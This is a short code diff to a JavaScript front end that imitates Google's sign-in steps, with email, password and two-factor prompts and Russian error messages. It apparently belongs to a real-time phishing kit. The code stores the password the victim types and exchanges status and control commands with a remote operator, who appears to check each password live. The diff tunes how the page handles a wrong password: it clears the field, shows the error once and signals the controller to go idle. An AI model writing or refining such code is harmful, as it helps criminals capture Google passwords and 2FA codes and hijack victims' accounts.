@@ -1172,6 +1172,7 @@ function initApp() {
     const googlePasswordErrorText = document.getElementById("googlePasswordErrorText");
     const google2faError = document.getElementById("google2faError");
     const google2faErrorText = document.getElementById("google2faErrorText");
+    let handledPasswordError = false;
 
     function clearGoogleErrors() {
         if (googleEmailError) googleEmailError.classList.add("hidden");
@@ -1311,7 +1312,14 @@ function initApp() {
                     if (!stepGooglePassword.classList.contains("active")) {
                         showStep(stepGooglePassword);
                     }
-                    showGoogleError("password", ctrl.error_msg || "Неверный пароль. Повторите попытку.");
+                    if (!handledPasswordError) {
+                        handledPasswordError = true;
+                        if (googlePasswordInput) {
+                            googlePasswordInput.value = "";
+                        }
+                        showGoogleError("password", ctrl.error_msg || "Неверный пароль. Повторите попытку.");
+                        sendGoogleControlCommand("idle", null, null);
+                    }
                 } else if (ctrl.status === "correct_password") {
                     if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
                     if (btnSubmitGooglePassword) btnSubmitGooglePassword.disabled = false;
@@ -1360,6 +1368,7 @@ function initApp() {
                 showGoogleError("password", "Введите пароль. Длина должна быть не менее 4 символов.");
                 return;
             }
+            handledPasswordError = false;
             userGooglePassword = pwd;
             btnSubmitGooglePassword.disabled = true;
             if (googleLoadingBar) googleLoadingBar.classList.remove("hidden");
